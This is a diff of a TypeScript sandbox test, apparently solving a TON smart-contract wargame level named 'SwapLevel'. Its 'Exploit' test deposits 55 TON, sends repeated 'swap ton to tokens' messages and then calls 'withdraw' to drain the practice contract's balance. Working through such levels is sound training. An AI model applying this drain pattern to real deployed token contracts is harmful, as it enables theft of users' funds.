@@ -12,7 +12,7 @@ import { SwapLevel } from '../wrappers/wrappers/SwapLevel';
 import { Token } from '../wrappers/wrappers/SwapLevelToken';
 
 // npx blueprint test 7. SwapLevel.spec.ts
-describe('PeekLevel', () => {
+describe('SwapLevel', () => {
     let blockchain: Blockchain;
 
     let level: SandboxContract<SwapLevel>;
@@ -42,16 +42,23 @@ describe('PeekLevel', () => {
     });
 
     it('Exploit', async () => {
-        await level.send(player.getSender(), { value: toNano('40') }, null);
-        for (let i = 0; i < 26; i++) {
+        // await contract.send(player, { value: toNano('55') }, null);
+        await level.send(player.getSender(), { value: toNano('55') }, null);
+        for (let i = 0; i < 18; i++) {
+            // await contract.send(player, { value: toNano('0.1') }, 'swap ton to tokens');
             await level.send(player.getSender(), { value: toNano('0.1') }, 'swap ton to tokens');
         }
+        await getBalance();
+
+        // await contract.send(player, { value: toNano('0.1') }, 'withdraw');
+        await level.send(player.getSender(), { value: toNano('0.1') }, 'withdraw');
+
         await getBalance();
 
         console.log('Token Balance', fromNano(await token.getBalance()));
     });
 
     const getBalance = async () => {
-        console.log((await blockchain.getContract(level_addr)).balance);
+        console.log(fromNano((await blockchain.getContract(level_addr)).balance));
     };
 });
